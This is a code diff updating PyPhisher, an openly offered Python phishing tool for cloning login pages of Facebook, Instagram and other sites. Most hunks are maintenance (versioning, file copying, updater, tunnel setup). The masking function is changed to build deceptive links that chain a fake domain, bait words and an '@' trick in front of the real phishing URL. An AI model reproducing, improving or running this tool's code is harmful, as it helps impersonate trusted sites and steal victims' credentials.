@@ -3,9 +3,9 @@
 # Author     : KasRoudra
 # Version    : 2.1
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : KasRoudra (2021-2023)
 # Github     : https://github.com/KasRoudra
-# Contact    : https://m.me/KasRoudra
+# Contact    : https://t.me/KasRoudra
 # Description: PyPhisher is a phishing tool in python
 # Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
 # 1st Commit : 08/08/2021
@@ -18,7 +18,7 @@
 """
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2021-2023 KasRoudra
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -48,6 +48,7 @@ from json import (
     loads as parse
 )
 from os import (
+    chmod,
     getenv,
     kill,
     listdir,
@@ -129,7 +130,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="2.1"
+version="2.1.3"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -148,7 +149,7 @@ logo = f"""
 {blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |{" "*19}       {cyan}[v{version}]
+{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
 {cyan}        |___/  {" "*11}      {red}[By \x4b\x61\x73\x52\x6f\x75\x64\x72\x61]
 """
 
@@ -184,7 +185,7 @@ for module in modules:
     except ImportError:
         try:
             print(f"Installing {module}")
-            run(f"pip3 install {module}", shell=True)
+            run(f"pip3 install {module} --break-system-packages", shell=True)
         except:
             print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
             exit(1)
@@ -222,7 +223,7 @@ cprint = Console().print
 columns = get_terminal_size().columns
 
 repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
-websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
+websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
@@ -334,8 +335,16 @@ def copy(path1, path2):
     if isdir(path1):
         if isdir(path2):
              rmtree(path2)
+        for item in listdir(path1):
+            old_file = join(path1, item)
+            new_file = join(path2, item)
+            if isdir(old_file):
+                copy(old_file, new_file)
+            else:
+                makedirs(dirname(new_file), exist_ok=True)
+                copy2(old_file, new_file)
         #copytree(path1, path2)
-        shell(f"cp -r {path1} {path2}")
+        #shell(f"cp -r {path1} {path2}")
     if isfile(path1):
         if isdir(path2):
             copy2(path1, path2)
@@ -417,6 +426,8 @@ def append(text, filename):
     with open(filename, "a") as file:
         file.write(str(text)+"\n")
         
+def get_ver(ver):
+    return int(ver.replace(".", "", 2))
 
 def get_meta(url):
     # Facebook requires some additional header
@@ -917,13 +928,17 @@ def masking(url):
         sprint(f"\n{error}No domain!")
         domain = "https://"
     else:
-        domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
-        domain = "https://"+domain+"-"
+        domain = "https://" + sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
     bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
     if bait=="":
         sprint(f"\n{error}No bait word!")
+        if domain!="https://":
+            bait = "@"
     else:
-        bait = sub("([/%+&?={} ])", "-", bait)+"@"
+        if domain!="https://":
+            bait = "-" + sub("([/%+&?={} ])", "-", bait) + "@"
+        else:
+            bait = sub("([/%+&?={} ])", "-", bait) + "@"
     final = domain+bait+short
     print()
     #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
@@ -947,15 +962,21 @@ def updater():
     if not isfile("files/pyphisher.gif"):
         return
     try:
-        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
+        toml_data = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/pyproject.toml").text
+        pattern = r'version\s*=\s*"([^"]+)"'
+        match = search(pattern, toml_data)
+        if match:
+            gh_ver = match.group(1)
+        else:
+            gh_ver = "404: Not Found"
     except Exception as e:
         append(e, error_file)
-        git_ver = version
-    if git_ver != "404: Not Found" and float(git_ver) > float(version):
+        gh_ver = version
+    if gh_ver != "404: Not Found" and get_ver(gh_ver) > get_ver(version):
         # Changelog of each versions are seperated by three empty lines
         changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
-        print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
+        print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{gh_ver}")
         upask=input(f"\n{ask}Do you want to update \x50\x79\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
         if upask=="y":
             print(nc)
@@ -1059,7 +1080,7 @@ def requirements():
         remove("loclx.zip")
     for tunneler in tunnelers:
         if isfile(f"{tunneler_dir}/{tunneler}"):
-            shell(f"chmod +x $HOME/.tunneler/{tunneler}")
+            chmod(f"{tunneler_dir}/{tunneler}", 0o755)
     for process in processes:
         if is_running(process):
             print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
@@ -1079,7 +1100,7 @@ def requirements():
     if isfile(f"{sites_dir}/version.txt"):
         with open(f"{sites_dir}/version.txt", "r") as sites_file:
             zipver=sites_file.read().strip()
-            if float(version) > float(zipver):
+            if get_ver(version) > get_ver(zipver):
                 download(websites_url, "websites.zip")
     else:
         download(websites_url, "websites.zip")
@@ -1251,7 +1272,7 @@ def server():
         sleep(1)
     lhr_success = False
     for i in range(10):
-        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
+        lhr_url = grep("(https://[-0-9a-z.]*.lhr.(life|pro))", lhr_file)
         if lhr_url != "":
             lhr_success = True
             break
@@ -1314,12 +1335,15 @@ def waiter():
     except KeyboardInterrupt:
         pexit()
 
-if __name__ == '__main__':
+def main():
     try:
         main_menu()
     except KeyboardInterrupt:
         pexit()
     except Exception as e:
         exception_handler(e)
+
+if __name__ == '__main__':
+    main()
             
 # If this code helped you, consider staring repository. Your stars encourage me a lot!
